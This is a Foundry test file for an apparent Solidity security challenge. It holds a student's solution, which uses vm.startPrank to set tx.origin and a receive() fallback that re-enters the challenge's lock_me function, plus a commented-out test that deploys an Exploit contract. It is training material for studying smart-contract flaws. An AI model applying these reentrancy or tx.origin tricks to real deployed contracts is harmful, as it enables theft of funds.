// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {Challenge} from "../src/Challenge.sol";
import {Exploit} from "../src/Challenge.sol";

contract ChallengeTest is Test {
  Challenge public challenge;

  address public student = makeAddr("student");
  string public studentName = "PELZ";

  function setUp() public {
    challenge = new Challenge();
  }

  //  Code your exploit from here below you are only permitted to use the student address and change the student name to yours. do nt prank the owner. GoodLuck.
  function test_exploit_pels() public {
    vm.startPrank(address(this), student);
    challenge.exploit_me(studentName);

    assertEq(challenge.winners(0), student);
    assertEq(challenge.Names(student), studentName);
  }

//   function test_exploit() public {
//     vm.prank(student);

//     Exploit exploit = new Exploit(address(challenge));
//     exploit.attack(studentName);

//     vm.stopPrank();

//     string[] memory winners = challenge.getAllwiners();

//     assertEq(winners.length, 1);
//     assertEq(winners[0], studentName);
//   }

  receive() external payable {
    challenge.lock_me();
  }
}
